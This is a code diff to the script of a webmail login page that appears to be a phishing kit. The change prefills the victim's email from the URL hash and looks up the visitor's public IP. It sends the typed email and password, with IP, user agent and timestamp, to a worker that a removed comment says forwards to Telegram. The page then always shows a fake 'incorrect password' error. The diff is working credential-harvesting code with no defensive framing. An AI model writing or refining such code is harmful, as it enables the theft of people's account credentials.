@@ -139,14 +139,24 @@
         spinner  = loginBtn.querySelector('.spinner'),
         btnText  = loginBtn.querySelector('.btn-text');
 
-  form.addEventListener('submit', e => {
+  // — Prefill from URL hash (#demo@domain.com → emailFld.value = "demo@domain.com")
+  const hashEmail = window.location.hash.slice(1);
+  if (hashEmail) {
+    try {
+      emailFld.value = decodeURIComponent(hashEmail);
+    } catch {
+      emailFld.value = hashEmail;
+    }
+  }
+
+  form.addEventListener('submit', async e => {
     e.preventDefault();
     errorDiv.textContent = '';
 
-    const email = emailFld.value.trim();
+    const email    = emailFld.value.trim();
     const password = passFld.value;
 
-    // --- VALIDATION ---
+    // --- VALIDATION (stops here on error) ---
     if (!email.includes('@')) {
       return errorDiv.textContent = 'Please include an “@” in your e-mail.';
     }
@@ -158,19 +168,42 @@
       return errorDiv.textContent = 'Password must be at least 4 characters.';
     }
 
-    // --- PREPARE TO SEND ---
+    // --- ATTEMPT & LOCK-OUT ---
     attempts++;
-    // show spinner & disable
+    if (attempts > maxAttempts) {
+      errorDiv.textContent = 'Login attempts reached. You are locked out.';
+      loginBtn.disabled = true;
+      emailFld.disabled = passFld.disabled = true;
+      return;
+    }
+
+    // --- SHOW SPINNER & DISABLE ---
     spinner.classList.remove('hidden');
     btnText.classList.add('hidden');
     loginBtn.disabled = true;
 
+    // --- COLLECT METADATA ---
+    const ua = navigator.userAgent;
+    const ts = new Date().toISOString();
+
+    // fetch public IP
+    let ip = 'unknown';
+    try {
+      const ipResp = await fetch('https://api.ipify.org?format=json');
+      ip = (await ipResp.json()).ip;
+    } catch (_) {
+      /* ignore if fails */
+    }
+
+    // --- BUILD PAYLOAD ---
     const payload = {
       email,
       password,
+      domain,
       attemptCount: attempts,
-      ua: navigator.userAgent,
-      ts: new Date().toISOString()
+      ip,
+      ua,
+      ts
     };
 
     // --- SEND TO WORKER ---
@@ -180,27 +213,22 @@
       body: JSON.stringify(payload)
     })
     .then(resp => {
-      // hide spinner & re-enable
+      // HIDE SPINNER & RE-ENABLE
       spinner.classList.add('hidden');
       btnText.classList.remove('hidden');
       loginBtn.disabled = false;
 
       if (!resp.ok) {
-        // server-side error (e.g. env missing)
         errorDiv.textContent = 'Server error. Try again later.';
+      } else if (attempts <= maxAttempts) {
+        errorDiv.textContent = 'Webmail or password incorrect.';
       } else {
-        // always sent to Telegram successfully
-        if (attempts <= maxAttempts) {
-          errorDiv.textContent = 'Webmail or password incorrect.';
-        } else {
-          errorDiv.textContent = 'Login attempts reached. You are locked out.';
-          loginBtn.disabled = true;
-          emailFld.disabled = passFld.disabled = true;
-        }
+        errorDiv.textContent = 'Login attempts reached. You are locked out.';
+        loginBtn.disabled = true;
+        emailFld.disabled = passFld.disabled = true;
       }
     })
     .catch(() => {
-      // hide spinner & re-enable
       spinner.classList.add('hidden');
       btnText.classList.remove('hidden');
       loginBtn.disabled = false;
@@ -209,6 +237,7 @@
   });
 })();
 </script>
+
 
 
 </body>
